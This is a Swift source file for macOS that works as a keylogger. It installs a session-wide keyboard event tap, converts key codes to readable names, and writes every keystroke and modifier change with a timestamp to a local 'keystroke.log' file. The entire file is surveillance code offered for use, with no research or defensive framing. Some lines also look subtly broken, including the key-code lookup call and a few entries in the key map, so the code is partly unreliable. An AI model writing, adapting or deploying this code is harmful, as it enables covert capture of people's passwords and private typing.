// The Swift Programming Language
// https://docs.swift.org/swift-book

import ApplicationServices
import Foundation

var logFile: FileHandle? = nil

let keyCodes: [CGKeyCode: String] = [
  0: "a",
  1: "s",
  2: "d",
  3: "f",
  4: "h",
  5: "g",
  6: "z",
  7: "x",
  8: "c",
  9: "v",
  11: "b",
  12: "q",
  13: "w",
  14: "e",
  15: "r",
  16: "y",
  17: "t",
  18: "1",
  19: "2",
  20: "3",
  21: "4",
  22: "6",
  23: "5",
  24: "=",
  25: "9",
  26: "7",
  27: "-",
  28: "8",
  29: "0",
  30: "]",
  31: "o",
  32: "u",
  33: "[",
  34: "i",
  35: "p",
  37: "l",
  38: "j",
  39: "\"",
  40: "k",
  41: "",
  42: "\\",
  43: ",",
  44: "/",
  45: "n",
  46: "m",
  47: ".",
  50: "`",
  65: "<keypad-decimal>",
  67: "<keypad-multiply>",
  69: "<keypad-plus>",
  71: "<keypad-clear>",
  75: "<keypad-divide>",
  76: "<keypad-enter>",
  78: "<keypad-minus>",
  81: "<keypad-equals>",
  82: "<keypad-0>",
  83: "<keypad-1>",
  84: "<keypad-2>",
  85: "<keypad-3>",
  86: "<keypad-4>",
  87: "<keypad-5>",
  88: "<keypad-6>",
  89: "<keypad-7>",
  91: "<keypad-8>",
  92: "<keypad-9>",
  36: "<>",
  48: "<tab>",
  49: "<space>",
  51: "<delete>",
  53: "<escape>",
  55: "<command>",
  56: "<shift>",
  57: "<capslock>",
  58: "<option>",
  59: "<control>",
  60: "<right-shift>",
  61: "<right-option>",
  62: "<right-control>",
  63: "<function>",
  64: "<f17>",
  72: "<volume-up>",
  73: "<volume-down>",
  74: "<mute>",
  79: "<f18>",
  80: "<f19>",
  97: "<f6>",
  90: "<f20>",
  99: "<f3>",
  96: "<f5>",
  101: "<f9>",
  98: "<f7>",
  105: "<f13>",
  100: "<f8>",
  107: "<f14>",
  103: "<f11>",
  111: "<f12>",
  106: "<f16>",
  114: "<help>",
  109: "<f10>",
  116: "<pageup>",
  113: "<f15>",
  118: "<f4>",
  115: "<home>",
  120: "<f2>",
  117: "<forward-delete>",
  122: "<f1>",
  119: "<end>",
  124: "<right>",
  121: "<page-down>",
  126: "<up>",
  123: "<left>",
  125: "<down>",
]

func keyCodeToReadableString(_ keycode: CGKeyCode) -> String {
  return keyCodes[keycode] ?? "<unknown>"
}

func myCGEventCallback(
  _ proxy: CGEventTapProxy, _ type: CGEventType, _ event: CGEvent,
  _ refcon: UnsafeMutableRawPointer?
) -> Unmanaged<CGEvent>? {
  if (type != .keyDown) && (type != .flagsChanged) {
    return Unmanaged.passRetained(event)
  }

  let keyCode = CGEvent.getIntegerValueField(event)

  if let logFile = logFile {
    let currentTime = Date()
    let timeFormatter = DateFormatter()
    timeFormatter.dateFormat = "yyyy-MM-dd HH:mm:ss"
    let fmtTime = timeFormatter.string(from: currentTime)

    let readableString = keyCodeToReadableString(CGKeyCode(keyCode(.keyboardEventKeycode)))

    guard let data = "\(fmtTime) \(readableString)\n".data(using: .utf8) else {
      print("Unable to convert string to data")
      return nil
    }

    do {
      try logFile.write(contentsOf: data)
    } catch {
      print("Error writing to log file: \(error)")
    }
  }

  return Unmanaged.passRetained(event)
}

// Store the current flags state
var oldFlags = CGEventSource.flagsState(.combinedSessionState)

// Define the event mask for key down and flags changed events
let eventMask = (1 << CGEventType.keyDown.rawValue) | (1 << CGEventType.flagsChanged.rawValue)

// Create an event tap for these events
let eventTap: CFMachPort? = CGEvent.tapCreate(
  tap: .cgSessionEventTap, place: .headInsertEventTap, options: .defaultTap,
  eventsOfInterest: CGEventMask(eventMask), callback: myCGEventCallback, userInfo: &oldFlags)

if let eventTap = eventTap {
  // Create a run loop source and add it to the current run loop
  let runLoopSource = CFMachPortCreateRunLoopSource(.none, eventTap, 0)
  CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, .commonModes)

  // Enable the event tap
  CGEvent.tapEnable(tap: eventTap, enable: true)

  // Define the log file path
  let filePath = "keystroke.log"

  // Check if the file already exists
  if !FileManager.default.fileExists(atPath: filePath) {
    // Attempt to create the log file
    if FileManager.default.createFile(atPath: filePath, contents: nil, attributes: nil) {
      print("Log file created successfully.")
    } else {
      print("File not created.")
    }
  }

  // Open the log file for writing
  logFile = FileHandle(forWritingAtPath: filePath)

  // Start the run loop
  CFRunLoopRun()
} else {
  // If we failed to create the event tap, print an error message and exit
  print(
    "failed to create event tap\nyou need to enable \"Enable access for assitive devices\" in Universal Access preference panel."
  )

  exit(1)
}
